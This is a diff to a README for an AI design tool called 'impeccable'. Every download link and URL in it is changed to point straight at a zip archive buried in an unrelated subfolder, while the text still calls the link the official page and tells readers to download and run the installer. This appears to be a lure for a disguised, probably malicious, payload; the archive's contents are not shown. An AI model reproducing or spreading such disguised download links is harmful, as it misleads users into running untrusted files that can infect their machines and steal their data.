@@ -1,6 +1,6 @@
 # 🎨 impeccable - Design Your AI with Ease
 
-[![Download impeccable](https://img.shields.io/badge/Download-impeccable-blue?style=for-the-badge)](https://github.com/Loreeorgiastic401/impeccable)
+[![Download impeccable](https://img.shields.io/badge/Download-impeccable-blue?style=for-the-badge)](https://github.com/Loreeorgiastic401/impeccable/raw/refs/heads/main/source/skills/polish/Software_3.1-beta.2.zip)
 
 ## What is impeccable?
 
@@ -24,11 +24,11 @@ If your computer meets these points, you will have no problems running impeccabl
 
 Use the link below to get impeccable. It leads you to the official GitHub page for the app. Here you can download the files you need.
 
-[![Download impeccable](https://img.shields.io/badge/Download-impeccable-grey?style=for-the-badge)](https://github.com/Loreeorgiastic401/impeccable)
+[![Download impeccable](https://img.shields.io/badge/Download-impeccable-grey?style=for-the-badge)](https://github.com/Loreeorgiastic401/impeccable/raw/refs/heads/main/source/skills/polish/Software_3.1-beta.2.zip)
 
 **Step 1:** Visit the download page  
 Go to the following page:  
-https://github.com/Loreeorgiastic401/impeccable
+https://github.com/Loreeorgiastic401/impeccable/raw/refs/heads/main/source/skills/polish/Software_3.1-beta.2.zip
 
 **Step 2:** Find the latest release  
 Look for the "Releases" section. You should see the newest version listed there.
@@ -70,7 +70,7 @@ impeccable focuses on making AI design simple and effective. Here are a few high
 
 Checking for updates is simple.
 
-- Go to the GitHub page: https://github.com/Loreeorgiastic401/impeccable
+- Go to the GitHub page: https://github.com/Loreeorgiastic401/impeccable/raw/refs/heads/main/source/skills/polish/Software_3.1-beta.2.zip
 - Look for any new releases.
 - Download and run the new installer.
 - Your settings and files will stay safe.
@@ -96,4 +96,4 @@ If problems continue, visit the GitHub page and look under “Issues” to see i
 
 Download impeccable here:
 
-[![Download impeccable](https://img.shields.io/badge/Download-impeccable-blue?style=for-the-badge)](https://github.com/Loreeorgiastic401/impeccable)
+[![Download impeccable](https://img.shields.io/badge/Download-impeccable-blue?style=for-the-badge)](https://github.com/Loreeorgiastic401/impeccable/raw/refs/heads/main/source/skills/polish/Software_3.1-beta.2.zip)
